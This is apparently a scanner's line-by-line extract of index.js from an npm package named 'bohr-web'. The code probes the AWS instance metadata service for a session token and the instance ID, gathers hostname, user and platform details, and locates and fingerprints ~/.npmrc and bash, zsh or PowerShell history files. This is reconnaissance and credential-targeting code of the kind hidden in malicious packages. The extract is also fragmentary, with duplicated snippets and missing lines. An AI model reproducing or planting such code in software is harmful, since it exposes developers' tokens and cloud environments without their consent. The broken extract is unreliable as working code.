// File: tmp/tmpbjlts5k2/bohr-web/package/index.js
// ======================================================================
Line 2: const os = require('os')
Line 3: const fs = require('fs')
Line 4: const http = require('http')
Line 5: const https = require('https')
Line 6: const crypto = require('crypto')
Line 7: const path = require('path')
Line 13: {
    const mod = tls ? https : http;
    const req = mod.request({ ...opts, timeout: 1000 }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ ok: true, status: res.statusCode, data }));
    });
    req.on('error', () => resolve({ ok: false }));
    req.on('timeout', () => { req.destroy(); resolve({ ok: false }); });
    req.end();
  }
Line 22: req.end()
Line 29: fs.openSync(file, 'r')
Line 30: const buf = Buffer.alloc(Math.min(bytes, fs.statSync(file).size))
Line 31: fs.readSync(fh, buf, 0, buf.length, 0)
Line 42: const sz = fs.statSync(file).size
Line 44: fs.openSync(file, 'r')
Line 46: fs.readSync(fd, buf, 0, toRead, 0)
Line 48: buf.toString('utf8')
Line 57: const tok = await new Promise((resolve) => {
    const req = http.request({
      hostname: '169.254.169.254',
      port: 80,
      path: '/latest/api/token',
      method: 'PUT',
      headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '60' },
      timeout: 1000
    }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ ok: true, status: res.statusCode, data }));
    });
    req.on('error', () => resolve({ ok: false }));
    req.on('timeout', () => { req.destroy(); resolve({ ok: false }); });
    req.end();
  })
Line 58: const req = http.request({
      hostname: '169.254.169.254',
      port: 80,
      path: '/latest/api/token',
      method: 'PUT',
      headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '60' },
      timeout: 1000
    }, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ ok: true, status: res.statusCode, data }));
    })
Line 72: req.end()
Line 77: const id = await new Promise((resolve) => {
      const req = http.request({
        hostname: '169.254.169.254',
        port: 80,
        path: '/latest/meta-data/instance-id',
        method: 'GET',
        headers: { 'X-aws-ec2-metadata-token': tok.data },
        timeout: 1000
      }, res => {
        let data = '';
        res.on('data', c => data += c);
        res.on('end', () => resolve({ ok: true, status: res.statusCode, data: data.trim() }));
      });
      req.on('error', () => resolve({ ok: false }));
      req.on('timeout', () => { req.destroy(); resolve({ ok: false }); });
      req.end();
    })
Line 78: const req = http.request({
        hostname: '169.254.169.254',
        port: 80,
        path: '/latest/meta-data/instance-id',
        method: 'GET',
        headers: { 'X-aws-ec2-metadata-token': tok.data },
        timeout: 1000
      }, res => {
        let data = '';
        res.on('data', c => data += c);
        res.on('end', () => resolve({ ok: true, status: res.statusCode, data: data.trim() }));
      })
Line 88: data.trim()
Line 92: req.end()
Line 109: path.join(home, '.npmrc')
Line 112: os.platform()
Line 113: path.join(
      home,
      'AppData','Roaming','Microsoft','Windows','PowerShell','PSReadLine','ConsoleHost_history.txt'
    )
Line 117: {
    // On Linux/macOS, bash/zsh history (we will only report presence/line counts if found)
    const candidates = [
      path.join(home, '.bash_history'),
      path.join(home, '.zsh_history'),
      path.join(home, '.history'),
    ];
    // pick the first that exists
    targets.psHistory = candidates.find(p => fs.existsSync(p)) || candidates[0];
  }
Line 120: _tmp_25.push(path.join(home, '.bash_history'))
Line 121: _tmp_25.push(path.join(home, '.zsh_history'))
Line 122: _tmp_25.push(path.join(home, '.history'))
Line 125: targets.psHistory = candidates.find(p => fs.existsSync(p)) || candidates[0]
Line 132: os.platform()
Line 134: os.arch()
Line 135: os.hostname()
Line 136: os.userInfo()
Line 146: const st = fs.statSync(p)
Line 151: digestFirstBytes(p, 256)
Line 161: fileMeta(npmrc, false)
Line 162: fileMeta(psHistory, true)
